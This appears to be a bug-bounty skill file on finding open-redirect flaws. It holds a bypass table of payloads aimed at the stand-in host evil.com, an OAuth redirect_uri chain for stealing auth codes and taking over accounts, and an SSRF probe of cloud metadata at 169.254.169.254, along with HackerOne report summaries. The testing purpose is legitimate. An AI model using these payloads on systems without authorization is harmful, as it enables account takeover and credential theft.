---
name: hunt-open-redirect
description: Open redirect hunting — bypass table (protocol-relative, backslash, at-sign, double-slash, null byte, whitespace, javascript:, subdomain, fragment), the chains that make it High/Critical (OAuth redirect_uri → ATO, server-side follow → SSRF, logout → session fixation), param harvesting with gf redirect, qsreplace automation. Use when redirect-style params (return/next/dest/go/forward/location) exist. Trigger keywords: open redirect, redirect_uri, URL redirect, next param.
---

# Open Redirect — Deep Hunting

## THE GATE
Standalone = Low; **the chains are the value**: OAuth redirect_uri → auth-code theft → 1-click ATO; server-side redirect follow → SSRF; logout redirect → session fixation.

## Bypass Table (exact payloads)
Basic `https://evil.com`; protocol-relative `//evil.com`; backslash `/\\evil.com`; at-sign `https://target.com@evil.com`; double-slash `//evil.com/%2F..`; `%2Fevil.com`; null byte `evil.com%00target.com`; whitespace `evil.com%09`/`%20`; `javascript:`/`data:` URIs; subdomain `https://target.com.evil.com`; fragment `https://evil.com#.target.com`.

## Methodology
Harvest params with `gf redirect` (+ `return|next|dest|go|forward|location|to|jump|target|out|link|logout`), `qsreplace` then check `Location:` with `--max-redirs 0`. **OAuth chain test**: `redirect_uri=https://target.com/redirect?url=https://evil.com` (URL-encoded `?`/`=`). **SSRF escalation**: if the app server-side-fetches the redirect destination, probe metadata (`/fetch?url=http://169.254.169.254/latest/meta-data/`).

## Validation
Location header → your controlled domain AND browser follows. **Mistakes**: reporting redirects standalone High; only basic payloads; forgetting `javascript:` stripped server-side but executes on `location.assign`; missing OAuth/SSRF chains that make it High/Critical.

## FIELD DATA — mined from HackerOne disclosed reports (10k-report corpus)

### Class: open-redirect — 198 disclosed H1 reports (14 High/Critical)

**Parameters seen in real findings** (recurring; test each on every endpoint):

- `url`
- `next`
- `redirect_uri`
- `email`
- `client_id`
- `scope`
- `response_type`
- `state`
- `query`
- `page`

**Representative finding shapes** (real report titles, genericized — use as test-case ideas, not templates):

- **[critical] Twitter lite(Android): Vulnerable to local file steal, Javascript injection, Open redirect** (Improper Access Control - Generic)
  - Signal: **Summary:** com.twitter.android.lite.TwitterLiteActivity is set to exported and doesn't validate data pass to intent due to which this activity vulnerable to steal users local fil
- **[critical] url redirection** (Open Redirect)
  - Signal: ## Summary: [the following url is vulnerable to redirect] https://app.upchieve.org ## Steps To Reproduce: when you add @evil.com the user will be directed to evil.com https://app.u
- **[high] Open Redirect in .greenhouse.io** (Open Redirect)
  - Signal: ## Open Redirect in scout24.greenhouse.io The **Scout24 Security Team** did a penetration test against `scout24.greenhouse.io` in order to verify how Scout24 relevant data is prote
- **[high] Open redirect due to scanning QR code via brave browser** (Open Redirect)
  - Signal: > NOTE! Thanks for submitting a report! Please fill all sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to verify and then

